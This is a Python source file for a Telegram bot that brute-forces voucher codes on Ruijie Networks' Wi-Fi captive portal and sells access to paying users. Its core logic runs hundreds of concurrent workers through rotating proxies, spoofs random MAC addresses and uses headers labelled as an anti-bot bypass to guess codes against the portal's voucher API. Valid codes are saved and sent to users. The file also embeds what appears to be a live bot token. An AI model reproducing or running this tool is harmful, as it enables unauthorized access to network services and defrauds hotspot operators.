# -*- coding: utf-8 -*-
import os
import re
import math
import time
import string
import random
import asyncio
import aiohttp
import aiosqlite
from typing import Callable, Dict, Any, Awaitable
from aiogram import Bot, Dispatcher, types, BaseMiddleware
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

class RateLimiter:
    def __init__(self, rate_limit_per_second: float):
        self.rate_limit_per_second = rate_limit_per_second
        self.tokens = rate_limit_per_second
        self.last_check = time.time()
        self.lock = asyncio.Lock()

    async def acquire(self):
        sleep_time = 0
        async with self.lock:
            now = time.time()
            elapsed = now - self.last_check
            self.last_check = now
            self.tokens = min(self.rate_limit_per_second, self.tokens + elapsed * self.rate_limit_per_second)

            if self.tokens < 1:
                sleep_time = (1 - self.tokens) / self.rate_limit_per_second
                self.tokens = 0
            else:
                self.tokens -= 1
        
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)

# --- Configuration ---
BOT_TOKEN="8638714257:AAE40FVmDlXEn8qH1rhIECMXUmIEJaQNQIQ"
BOT_ID = "bot14" # bot2, bot3 အတွက် ပြောင်းပေးရန်

# Master Database
MASTER_DB = "/root/ruijie_bots/ruijie_master.db"

ADMIN_ID = 7289768738
ADMIN_USERNAME = "@Developer12920"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
db = None

# 🌟 Safe Limits (Ruijie IP Block မခံရစေရန် အလုံခြုံဆုံး သတ်မှတ်ချက်)
ADMIN_RATE_LIMIT = 2500  
USER_RATE_LIMIT = 1500   
admin_limiter = RateLimiter(ADMIN_RATE_LIMIT)
user_limiter = RateLimiter(USER_RATE_LIMIT)

# --- State Tracking ---
active_tasks = {}
stop_events = {}
task_stats = {}
resume_states = {}
batch_writes = {}

def init_user_state(tg_id):
    if tg_id not in stop_events: stop_events[tg_id] = asyncio.Event()
    if tg_id not in task_stats: task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": None, "status": "Idle", "speed": 0}
    if tg_id not in resume_states: resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}
    if tg_id not in batch_writes: batch_writes[tg_id] = []

def get_user_db_path(tg_id):
    return f"/root/ruijie_bots/user_data_{tg_id}.db"

# ==========================================
# 💾 SQLite Micro-Database Engine
# ==========================================
async def init_db():
    global db
    db = await aiosqlite.connect(MASTER_DB, timeout=20.0)
    db.row_factory = aiosqlite.Row
    await db.execute("PRAGMA journal_mode=WAL;")
    
    await db.execute('''CREATE TABLE IF NOT EXISTS tg_users (
        tg_id INTEGER PRIMARY KEY,
        approval_type TEXT,
        expires_at REAL,
        allowed_codes INTEGER,
        found_codes INTEGER,
        session_url TEXT,
        current_setup_id TEXT,
        old_setup_id TEXT,
        live_notify INTEGER,
        is_running INTEGER,
        assigned_bot TEXT,
        saved_views_after_expiry INTEGER
    )''')
    await db.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
        id TEXT PRIMARY KEY,
        user_workers INTEGER,
        admin_workers INTEGER
    )''')
    await db.commit()

async def init_user_db(tg_id):
    db_path = get_user_db_path(tg_id)
    async with aiosqlite.connect(db_path, timeout=20.0) as udb:
        await udb.execute("PRAGMA journal_mode=WAL;")
        await udb.execute('''CREATE TABLE IF NOT EXISTS vouchers (
            code TEXT,
            setup_id TEXT,
            status TEXT,
            PRIMARY KEY (code, setup_id)
        )''')
        await udb.commit()

async def get_user(tg_id):
    async with db.execute("SELECT * FROM tg_users WHERE tg_id=?", (tg_id,)) as c:
        row = await c.fetchone()
        return dict(row) if row else None

async def update_user(tg_id, data):
    async with db.execute("SELECT tg_id FROM tg_users WHERE tg_id=?", (tg_id,)) as c:
        exists = await c.fetchone()
    if exists:
        set_clause = ", ".join(f"{k}=?" for k in data.keys())
        values = list(data.values()) + [tg_id]
        await db.execute(f"UPDATE tg_users SET {set_clause} WHERE tg_id=?", values)
    else:
        cols = ", ".join(data.keys())
        placeholders = ", ".join("?" for _ in data)
        values = [tg_id] + list(data.values())
        await db.execute(f"INSERT INTO tg_users (tg_id, {cols}) VALUES (?, {placeholders})", values)
    await db.commit()

async def inc_found_codes(tg_id):
    async with db.execute("SELECT found_codes, allowed_codes, approval_type FROM tg_users WHERE tg_id=?", (tg_id,)) as c:
        row = await c.fetchone()
        if row:
            new_val = (row["found_codes"] or 0) + 1
            await db.execute("UPDATE tg_users SET found_codes=? WHERE tg_id=?", (new_val, tg_id))
            await db.commit()
            return {"found_codes": new_val, "allowed_codes": row["allowed_codes"], "approval_type": row["approval_type"]}
    return None

async def get_user_worker_count():
    async with db.execute("SELECT user_workers FROM bot_settings WHERE id='config'") as c:
        row = await c.fetchone()
        return row["user_workers"] if row and row["user_workers"] else 80

async def set_user_worker_count(count):
    async with db.execute("SELECT id FROM bot_settings WHERE id='config'") as c:
        exists = await c.fetchone()
    if exists:
        await db.execute("UPDATE bot_settings SET user_workers=? WHERE id='config'", (count,))
    else:
        await db.execute("INSERT INTO bot_settings (id, user_workers) VALUES ('config', ?)", (count,))
    await db.commit()

async def get_admin_worker_count():
    async with db.execute("SELECT admin_workers FROM bot_settings WHERE id='config'") as c:
        row = await c.fetchone()
        return row["admin_workers"] if row and row["admin_workers"] else 300

async def set_admin_worker_count(count):
    async with db.execute("SELECT id FROM bot_settings WHERE id='config'") as c:
        exists = await c.fetchone()
    if exists:
        await db.execute("UPDATE bot_settings SET admin_workers=? WHERE id='config'", (count,))
    else:
        await db.execute("INSERT INTO bot_settings (id, admin_workers) VALUES ('config', ?)", (count,))
    await db.commit()

# --- Proxy Setup ---
PROXIES = []
try:
    proxy_path = "/root/ruijie_bots/proxies.txt"
    if os.path.exists(proxy_path):
        with open(proxy_path, "r") as f:
            PROXIES = [line.strip() for line in f if line.strip() and line.startswith("http")]
except Exception:
    pass

def get_random_proxy():
    if PROXIES: return random.choice(PROXIES)
    return None

# ==========================================
# 🛡️ Middleware
# ==========================================
class AccessMiddleware(BaseMiddleware):
    async def __call__(self, handler: Callable[[types.Message, Dict[str, Any]], Awaitable[Any]], event: types.Message, data: Dict[str, Any]) -> Any:
        if isinstance(event, types.CallbackQuery):
             tg_id = event.from_user.id
             if any(event.data.startswith(p) for p in ['admin_']):
                 if tg_id != ADMIN_ID:
                     await event.answer("⛔ Admin Only.", show_alert=True)
                     return
             else:
                  user = await get_user(tg_id)
                  is_active = False
                  if user:
                      if user.get("approval_type") == "count":
                          is_active = (user.get("found_codes") or 0) < (user.get("allowed_codes") or 0)
                      else:
                          is_active = time.time() < (user.get("expires_at") or 0)
                  if tg_id != ADMIN_ID and not is_active:
                        await event.answer("⚠️ အသုံးပြုခွင့် မရှိပါ။", show_alert=True)
                        return
             return await handler(event, data)
             
        if not isinstance(event, types.Message): return await handler(event, data)
        tg_id = event.from_user.id
        if tg_id == ADMIN_ID: return await handler(event, data)
        if event.text and event.text.startswith('/start'): return await handler(event, data)
            
        user = await get_user(tg_id)
        is_active = False
        is_expired = False
        if user:
            if user.get("approval_type") == "count":
                is_active = (user.get("found_codes") or 0) < (user.get("allowed_codes") or 0)
            else:
                is_active = time.time() < (user.get("expires_at") or 0)
            is_expired = not is_active
                
        if is_active:
            if tg_id != ADMIN_ID:
                assigned_bot = user.get("assigned_bot") or "bot1"
                if assigned_bot != "any" and assigned_bot != BOT_ID:
                    msg_text = f"⛔ တားမြစ်ထားသည်။ သင်သည် ဤ Bot ကို အသုံးပြုခွင့် မရှိပါ။\n👉 ကျေးဇူးပြု၍ {assigned_bot.upper()} သို့ သွားရောက် အသုံးပြုပါ။"
                    await event.answer(msg_text)
                    return
            return await handler(event, data)
        else:
            if event.text and (event.text.startswith('/saved') or event.text.startswith('/refresh')) and is_expired:
                return await handler(event, data)
            elif event.text and event.text.startswith('/'):
                await event.answer(f"⚠️ သင်၏ အသုံးပြုခွင့် မရှိပါ (သို့) ပြည့်သွားပါပြီ။ Admin ကို ဆက်သွယ်ပါ။", parse_mode="Markdown")
            return

dp.message.middleware(AccessMiddleware())
dp.callback_query.middleware(AccessMiddleware())

# ==========================================
# 👑 Admin UI & Commands
# ==========================================
def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton(text="👥 View Users", callback_data="admin_view_users")],
        [
            InlineKeyboardButton(text="⏱️ Add Time", callback_data="admin_add_time_user"),
            InlineKeyboardButton(text="🔢 Add Count", callback_data="admin_add_count_user")
        ],
        [
            InlineKeyboardButton(text="⚡ User Speed", callback_data="admin_set_workers"),
            InlineKeyboardButton(text="🚀 Admin Speed", callback_data="admin_set_admin_workers")
        ],
        [
            InlineKeyboardButton(text="➖ Remove User", callback_data="admin_remove_user"),
            InlineKeyboardButton(text="🗑️ Clear Saved", callback_data="admin_clear_saved")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

@dp.message(Command("admin"))
async def cmd_admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("🛠️ **Admin Control Panel** 🛠️\n\nWelcome Admin!", reply_markup=get_admin_keyboard(), parse_mode="Markdown")

@dp.callback_query(lambda c: c.data and c.data.startswith('admin_'))
async def process_admin_callback(callback_query: types.CallbackQuery):
    action = callback_query.data
    if action == "admin_view_users":
        msg, count = "👥 **လက်ရှိခွင့်ပြုထားသော User များ:**\n\n", 0
        async with db.execute("SELECT * FROM tg_users") as c:
            async for row in c:
                user = dict(row)
                app_type = user.get("approval_type", "time")
                assigned_bot = (user.get("assigned_bot") or "bot1").upper()
                if app_type == "count":
                    rem_codes = (user.get("allowed_codes") or 0) - (user.get("found_codes") or 0)
                    if rem_codes > 0:
                        count += 1; msg += f"ID: `{user['tg_id']}` | Bot: {assigned_bot} | ကျန် Code: {rem_codes} ခု\n"
                else:
                    rem_time = (user.get("expires_at") or 0) - time.time()
                    if rem_time > 0:
                        count += 1; hours, mins = int(rem_time // 3600), int((rem_time % 3600) // 60)
                        msg += f"ID: `{user['tg_id']}` | Bot: {assigned_bot} | ကျန်ချိန်: {hours}h {mins}m\n"
        if count == 0: msg += "လက်ရှိ ခွင့်ပြုပေးထားသူ မရှိပါ။"
        await callback_query.message.answer(msg, parse_mode="Markdown")
        
    elif action == "admin_add_time_user":
        await callback_query.message.answer("⏱️ အချိန်ဖြင့် ခွင့်ပြုရန်\n👉 `/adduser <tg_id> <hours>`", parse_mode="Markdown")
    elif action == "admin_add_count_user":
        await callback_query.message.answer("🔢 Code အရေအတွက်ဖြင့် ခွင့်ပြုရန်\n👉 `/addcount <tg_id> <code_count>`", parse_mode="Markdown")
    elif action == "admin_set_workers":
        await callback_query.message.answer("⚡ User များ၏ Speed ပြင်ရန်\n👉 `/setworkers <number>`", parse_mode="Markdown")
    elif action == "admin_set_admin_workers":
        await callback_query.message.answer("🚀 Admin ၏ Speed ပြင်ရန်\n👉 `/worker_admin <number>`", parse_mode="Markdown")
    elif action == "admin_remove_user":
         await callback_query.message.answer("✏️ User ဖယ်ရှားရန်\n👉 `/removeuser <tg_id>`", parse_mode="Markdown")
    elif action == "admin_clear_saved":
         await callback_query.message.answer("🗑️ User ၏ Code များဖျက်ရန်\n👉 `/clearsaved <tg_id>`", parse_mode="Markdown")
    await callback_query.answer()

@dp.message(Command("assign"))
async def cmd_assign(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return await message.answer("Usage: `/assign <tg_id> <bot1/bot2/bot3/any>`", parse_mode="Markdown")
    try: target_id = int(args[1])
    except: return await message.answer("❌ Invalid TG ID")
    target_bot = args[2].lower()
    if target_bot not in ["bot1", "bot2", "bot3", "any"]: 
        return await message.answer("❌ မှားယွင်းနေပါသည်။ bot1, bot2, bot3 သို့မဟုတ် any သာ ရိုက်ပါ။")
    
    await update_user(target_id, {"assigned_bot": target_bot})
    await message.answer(f"✅ User `{target_id}` ကို `{target_bot.upper()}` သို့ ရွှေ့ပြောင်း သတ်မှတ်လိုက်ပါပြီ。\n*(အကယ်၍ ၎င်းသည် ယခင် Bot တွင် Task အဟောင်း Run နေပါက ၃ စက္ကန့်အတွင်း အလိုအလျောက် ရပ်တန့်သွားပါမည်)*", parse_mode="Markdown")

@dp.message(Command("adduser"))
async def cmd_adduser(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return
    try: target_id, hours = int(args[1]), float(args[2])
    except: return
    expires_at = time.time() + (hours * 3600)
    await update_user(target_id, {"approval_type": "time", "expires_at": expires_at, "saved_views_after_expiry": 0})
    await message.answer(f"✅ User `{target_id}` ကို အချိန် `{hours}` နာရီဖြင့် ခွင့်ပြုလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("addcount"))
async def cmd_addcount(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return
    try: target_id, count = int(args[1]), int(args[2])
    except: return
    await update_user(target_id, {"approval_type": "count", "allowed_codes": count, "found_codes": 0, "saved_views_after_expiry": 0})
    await message.answer(f"✅ User `{target_id}` ကို Code အရေအတွက် `{count}` ခုဖြင့် ရှာဖွေခွင့် ပေးလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("removeuser"))
async def cmd_removeuser(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return
    try: target_id = int(args[1])
    except: return
    await update_user(target_id, {"approval_type": "expired", "expires_at": 0, "allowed_codes": 0})
    await message.answer(f"🗑️ User `{target_id}` ကို ဖြုတ်ချလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("clearsaved"))
async def cmd_clearsaved(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return
    try: target_id = int(args[1])
    except: return
    
    user_db_path = get_user_db_path(target_id)
    if os.path.exists(user_db_path):
        async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
            async with udb.execute("DELETE FROM vouchers") as c:
                deleted = c.rowcount
            await udb.commit()
        await message.answer(f"✅ User `{target_id}` ၏ Code အဟောင်း ({deleted}) ခုကို ဖျက်လိုက်ပါပြီ。", parse_mode="Markdown")
    else:
        await message.answer(f"✅ User `{target_id}` ၏ ဖျက်ရန် Code မရှိပါ။", parse_mode="Markdown")

@dp.message(Command("setworkers"))
async def cmd_setworkers(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return await message.answer("Usage: `/setworkers <number>`")
    try: new_workers = int(args[1])
    except: return await message.answer("❌ ဂဏန်းသာ ထည့်ပါ။")
    await set_user_worker_count(new_workers)
    await message.answer(f"✅ User များ၏ Speed (Worker) ကို `{new_workers}` သို့ ပြောင်းလဲသတ်မှတ်လိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("worker_admin"))
async def cmd_worker_admin(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return await message.answer("Usage: `/worker_admin <number>`")
    try: new_workers = int(args[1])
    except: return await message.answer("❌ ဂဏန်းသာ ထည့်ပါ။")
    await set_admin_worker_count(new_workers)
    await message.answer(f"✅ Admin ၏ Speed (Worker) ကို `{new_workers}` သို့ ပြောင်းလဲသတ်မှတ်လိုက်ပါပြီ。", parse_mode="Markdown")

# ==========================================
# ⚙️ Core Logic - THE SAFE & STABLE ENGINE
# ==========================================
def generate_mac():
    m = [random.randint(0x00, 0xff) for _ in range(6)]
    m[0] = (m[0] | 0x02) & 0xfe 
    return ':'.join(f'{x:02x}' for x in m)

async def get_session_id(session, url, current_sid, proxy=None):
    if not url: return current_sid
    n_m = generate_mac()
    s_u_s = re.sub(r'mac=[^&]+', f'mac={n_m}', url) if 'mac=' in url else url
    
    # 🌟 Security Headers (Ruijie Anti-Bot Bypass)
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'referer': s_u_s,
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(s_u_s, headers=headers, proxy=proxy, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return current_sid

async def check_voucher(session, session_id, voucher, proxy=None):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    
    # 🌟 Security Headers (Ruijie Anti-Bot Bypass)
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.post(post_url, headers=headers, json=data, proxy=proxy, timeout=5) as req:
            res = await req.text()
            if "logonUrl" in res: return "SUCCESS"
            elif "STA" in res: return "LIMITED"
            elif "failed" in res or "expired" in res: return "FAILED"
    except: return "ERROR"
    return "FAILED"

def parse_mode(mode_arg):
    mapping = {"1": "digit", "2": "ascii-lower", "3": "ascii-upper", "4": "ascii-mix", "5": "alphanumeric"}
    return mapping.get(str(mode_arg))

def get_char_set(mode):
    if mode == "digit": return string.digits
    elif mode == "ascii-lower": return string.ascii_lowercase
    elif mode == "ascii-upper": return string.ascii_uppercase
    elif mode == "ascii-mix": return string.ascii_letters
    elif mode == "alphanumeric": return string.ascii_lowercase + string.digits
    else: return string.digits

async def brute_force_task(message: types.Message, mode: str, length: int, target_success: int = None, is_resume: bool = False):
    tg_id = message.chat.id
    status_msg = None
    try:
        init_user_state(tg_id)
        stop_events[tg_id].clear()
        
        status_msg = await message.answer("🚀 Brute force initializing...")

        user_doc = await get_user(tg_id)
        session_url = user_doc.get("session_url") if user_doc else None
        setup_id = user_doc.get("current_setup_id") if user_doc else None
        live_notify = user_doc.get("live_notify", 0) if user_doc else 0

        if not session_url or not setup_id:
            await status_msg.edit_text("❌ Run `/setup <url>` first.", parse_mode="Markdown")
            return

        admin_count = await get_admin_worker_count()
        user_count = await get_user_worker_count()
        workers_count = admin_count if tg_id == ADMIN_ID else user_count

        await init_user_db(tg_id)
        user_db_path = get_user_db_path(tg_id)

        checked_set = set()
        async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
            async with udb.execute("SELECT code FROM vouchers WHERE setup_id=? AND status IN ('SUCCESS', 'LIMITED')", (setup_id,)) as c:
                async for row in c:
                    checked_set.add(row[0])

        chars = get_char_set(mode)
        base = len(chars)
        n = base ** length
        s = n // 2 + 13579
        while math.gcd(s, n) != 1: s += 1
        
        if is_resume and resume_states[tg_id]["mode"] == mode and resume_states[tg_id]["length"] == length and resume_states[tg_id]["start_offset"] is not None:
            start_offset = resume_states[tg_id]["start_offset"]
            start_idx = resume_states[tg_id]["current_idx"]
            task_stats[tg_id]["status"] = "Running (Resumed)"
            if target_success is None: target_success = resume_states[tg_id].get("target_success")
            task_stats[tg_id]["target_success"] = target_success
        else:
            offset_max = min(n - 1, 10**18) 
            start_offset = random.randint(0, offset_max)
            start_idx = 0
            task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": target_success, "status": "Running", "speed": 0}
            resume_states[tg_id] = {"mode": mode, "length": length, "start_offset": start_offset, "current_idx": 0, "target_success": target_success}

        if start_idx >= n:
            await status_msg.edit_text("✅ ဤ Mode အတွက် ဖြစ်နိုင်ချေရှိသော Code အားလုံးကို ရှာဖွေပြီးသွားပါပြီ။ /brute ဖြင့် အသစ်ပြန်စပါ။")
            return

        def voucher_generator():
            for i in range(start_idx, n):
                resume_states[tg_id]["current_idx"] = i
                idx = (start_offset + i * s) % n
                temp_idx = idx
                res = []
                for _ in range(length):
                    res.append(chars[temp_idx % base])
                    temp_idx //= base
                v = "".join(reversed(res))
                if v not in checked_set: yield v

        vouchers_iter = voucher_generator()
        
        # 🌟 TCP Limit (Safe Concurrency)
        connector = aiohttp.TCPConnector(limit=250, ttl_dns_cache=300, keepalive_timeout=60)
        start_time = asyncio.get_event_loop().time()
        initial_attempts = task_stats[tg_id]["attempts"]

        async with aiohttp.ClientSession(connector=connector) as session:
            
            shared_session_id = await get_session_id(session, session_url, None)
            session_lock = asyncio.Lock()

            async def worker():
                nonlocal shared_session_id
                local_loop_cnt = 0
                
                # 🌟 Stagger Start (Thundering Herd ကာကွယ်ရန်)
                await asyncio.sleep(random.uniform(0.1, 2.5))
                
                while not stop_events[tg_id].is_set():
                    current_proxy = get_random_proxy()
                    
                    limiter = admin_limiter if tg_id == ADMIN_ID else user_limiter
                    await limiter.acquire()

                    if local_loop_cnt > 0 and local_loop_cnt % 20 == 0: 
                        if not session_lock.locked():
                            async with session_lock:
                                shared_session_id = await get_session_id(session, session_url, shared_session_id, proxy=current_proxy)
                                
                    if not shared_session_id:
                        if not session_lock.locked():
                            async with session_lock:
                                if not shared_session_id:
                                    shared_session_id = await get_session_id(session, session_url, shared_session_id, proxy=current_proxy)
                        else:
                            await asyncio.sleep(0.5)
                            continue
                        
                    if stop_events[tg_id].is_set(): break
                        
                    try: voucher = next(vouchers_iter)
                    except StopIteration: break
                    except Exception: continue

                    status = await check_voucher(session, shared_session_id, voucher, proxy=current_proxy)
                    task_stats[tg_id]["attempts"] += 1

                    if status in ["SUCCESS", "LIMITED"]:
                        task_stats[tg_id]["found"] += 1
                        if status == "SUCCESS":
                            task_stats[tg_id]["success_count"] += 1
                            
                        if live_notify:
                            try: await bot.send_message(tg_id, f"🎉 **Code တွေ့ရှိပါသည်!**\n\nCode: `{voucher}`\nStatus: `{status}`", parse_mode="Markdown")
                            except: pass

                        batch_writes[tg_id].append({"code": voucher, "setup_id": setup_id, "status": status})
                        
                        if tg_id != ADMIN_ID:
                            updated_user = await inc_found_codes(tg_id)
                            if updated_user and updated_user.get("approval_type") == "count":
                                if updated_user.get("found_codes", 0) >= updated_user.get("allowed_codes", 0):
                                    stop_events[tg_id].set()
                                    try: await bot.send_message(tg_id, "⚠️ **အသိပေးချက်** ⚠️\n\nသင်၏ Code ရှာဖွေခွင့် အရေအတွက် ပြည့်သွားပါပြီ။\nအလုပ်လုပ်နေသော Task ကို ရပ်တန့်လိုက်ပါသည်။", parse_mode="Markdown")
                                    except: pass
                                    
                        if task_stats[tg_id]["target_success"] and task_stats[tg_id]["success_count"] >= task_stats[tg_id]["target_success"]:
                             stop_events[tg_id].set()
                             try: await bot.send_message(tg_id, f"🎯 **အသိပေးချက်:** သတ်မှတ်ထားသော SUCCESS Code ({task_stats[tg_id]['target_success']} ခု) ပြည့်သွားပါပြီ။ ရှာဖွေမှုကို ရပ်တန့်လိုက်ပါသည်။", parse_mode="Markdown")
                             except: pass
                             break

                    local_loop_cnt += 1
                    
                    # 🌟 Network Yielding (Display မထစ်စေရန်)
                    await asyncio.sleep(0.01)

            async def stats_updater():
                try:
                    last_text = ""
                    while not stop_events[tg_id].is_set():
                        await asyncio.sleep(3) 
                        
                        if batch_writes.get(tg_id):
                            ops = batch_writes[tg_id][:]
                            batch_writes[tg_id].clear()
                            if ops:
                                try:
                                    tuples = [(op["code"], op["setup_id"], op["status"]) for op in ops]
                                    async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
                                        await udb.executemany("INSERT OR REPLACE INTO vouchers (code, setup_id, status) VALUES (?, ?, ?)", tuples)
                                        await udb.commit()
                                except Exception: pass

                        if tg_id != ADMIN_ID:
                            user_data = await get_user(tg_id)
                            is_active = False
                            is_assigned_here = True
                            assigned_bot_name = ""
                            
                            if user_data:
                                if user_data.get("approval_type") == "count":
                                    is_active = (user_data.get("found_codes") or 0) < (user_data.get("allowed_codes") or 0)
                                else:
                                    is_active = time.time() < (user_data.get("expires_at") or 0)
                                
                                assigned_bot = user_data.get("assigned_bot") or "bot1"
                                if assigned_bot != "any" and assigned_bot != BOT_ID:
                                    is_assigned_here = False
                                    assigned_bot_name = assigned_bot.upper()
                                    
                            if not is_active or not is_assigned_here:
                                stop_events[tg_id].set()
                                if not is_assigned_here:
                                    try: await bot.send_message(tg_id, f"⚠️ **အသိပေးချက်:** သင့်အား {assigned_bot_name} သို့ ပြောင်းရွှေ့လိုက်သဖြင့် ဤ Bot ပေါ်ရှိ Task ကို အလိုအလျောက် ရပ်တန့်လိုက်ပါသည်။", parse_mode="Markdown")
                                    except: pass
                                else:
                                    try: await bot.send_message(tg_id, "⚠️ သင်၏ အသုံးပြုခွင့် ပြည့်သွားပါပြီ။ Task ရပ်တန့်လိုက်ပါသည်။", parse_mode="Markdown")
                                    except: pass
                                break
                                
                        elapsed = asyncio.get_event_loop().time() - start_time
                        current_attempts = task_stats[tg_id]["attempts"] - initial_attempts
                        speed = current_attempts / elapsed if elapsed > 0 else 0
                        task_stats[tg_id]["speed"] = speed
                        proxy_status = "ON" if PROXIES else "OFF"
                        
                        text = (f"📋 Task Status: {task_stats[tg_id]['status']}\n⚡ Speed: {speed:.0f}/sec\n"
                                f"🔍 Checked: {task_stats[tg_id]['attempts']}\n💎 Found (Total): {task_stats[tg_id]['found']}\n🌐 Proxy: {proxy_status}\n")
                        if task_stats[tg_id]["target_success"]:
                            text += f"🎯 Target Success: {task_stats[tg_id]['success_count']} / {task_stats[tg_id]['target_success']}"
                            
                        if text != last_text:
                            try:
                                await status_msg.edit_text(text)
                                last_text = text
                            except Exception: pass 
                except asyncio.CancelledError:
                    pass

            workers = [asyncio.create_task(worker()) for _ in range(workers_count)]
            updater = asyncio.create_task(stats_updater())

            try:
                await asyncio.gather(*workers, return_exceptions=True)
            except asyncio.CancelledError:
                raise 
            finally:
                stop_events[tg_id].set()
                for w in workers:
                    if not w.done(): w.cancel()
                if not updater.done(): updater.cancel()
                
                # Final Batch Write
                if batch_writes.get(tg_id):
                    ops = batch_writes[tg_id][:]
                    batch_writes[tg_id].clear()
                    if ops:
                        try:
                            tuples = [(op["code"], op["setup_id"], op["status"]) for op in ops]
                            async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
                                await udb.executemany("INSERT OR REPLACE INTO vouchers (code, setup_id, status) VALUES (?, ?, ?)", tuples)
                                await udb.commit()
                        except Exception: pass
                
                try: await updater
                except asyncio.CancelledError: pass

        if task_stats[tg_id]["status"] != "Idle":
            task_stats[tg_id]["status"] = "Stopped/Completed"
            final_text = (f"🏁 **Brute Force {task_stats[tg_id]['status']}**\n\n🔍 Checked: {task_stats[tg_id]['attempts']}\n💎 Found (Total): {task_stats[tg_id]['found']}")
            if task_stats[tg_id]["target_success"]:
                final_text += f"\n🎯 Target Success: {task_stats[tg_id]['success_count']} / {task_stats[tg_id]['target_success']}"
            try: await status_msg.edit_text(final_text, parse_mode="Markdown")
            except: pass
            
    except asyncio.CancelledError:
        pass
    except Exception as e:
        if status_msg:
            try: await status_msg.edit_text(f"❌ **Error တွေ့ရှိပါသည်:**\n`{str(e)}`\n👉 ကျေးဇူးပြု၍ `/refresh` ကို ရိုက်ထည့်ပြီး အသစ်ပြန်စပါ။", parse_mode="Markdown")
            except: pass
            
    finally:
        await update_user(tg_id, {"is_running": 0})
        current_task = active_tasks.get(tg_id)
        if current_task and current_task == asyncio.current_task():
            del active_tasks[tg_id]

# ==========================================
# 💬 Commands & Interface
# ==========================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    tg_id = message.from_user.id
    user = await get_user(tg_id)
    is_active = False
    role_text = "[GUEST: UNREGISTERED]"
    
    if tg_id == ADMIN_ID: role_text = "👑 **Admin**"
    else:
        if user:
            approval_type = user.get("approval_type", "time")
            if approval_type == "count":
                rem_codes = (user.get("allowed_codes") or 0) - (user.get("found_codes") or 0)
                is_active = rem_codes > 0
                if is_active: role_text = f"👤 **User** (ကျန် Code: {rem_codes} ခု)"
                else: role_text = "❌ **Limit Reached**"
            else:
                rem_time = (user.get("expires_at") or 0) - time.time()
                is_active = rem_time > 0
                if is_active: role_text = f"👤 **User** (ကျန်ချိန်: {int(rem_time//3600)}h {int((rem_time%3600)//60)}m)"
                else: role_text = "❌ **Expired**"
        else: role_text = "❌ **Unregistered**"

    welcome = (
        f"✅ Bot Active. Your Role: {role_text}\n\n"
        "**အသုံးပြုနိုင်သော Commands များ:**\n"
        "`/help` (Bot အသုံးပြုနည်းကြည့်ရန်)\n"
        "`/setup <url>` (Portal URL ထည့်ရန်)\n"
        "`/brute <mode> <length> [number]`\n"
        "`/notify` (Code ရတိုင်း ချက်ချင်း Chat ထဲပို့မည့်စနစ်ကို အဖွင့်/အပိတ်လုပ်ရန်)\n"
        "`/saved` (အောင်မြင်ထားသော Code များကြည့်ရန်)\n"
        "`/clear_saved` (သိမ်းထားသော Code များကို ဖျက်ရန်)\n"
        "`/status` (လက်ရှိအခြေအနေ ကြည့်ရန်)\n"
        "`/refresh` (Bot ထစ်နေပါက ရှင်းလင်းရန် - Setup/Saved မပျက်ပါ)\n"
        "`/stop` (ရပ်တန့်ရန်)\n\n"
    )
    
    if tg_id == ADMIN_ID: 
        await message.answer(welcome + "**Admin Panel:**\n👉 Send `/admin` to open the control panel.", parse_mode="Markdown")
    else:
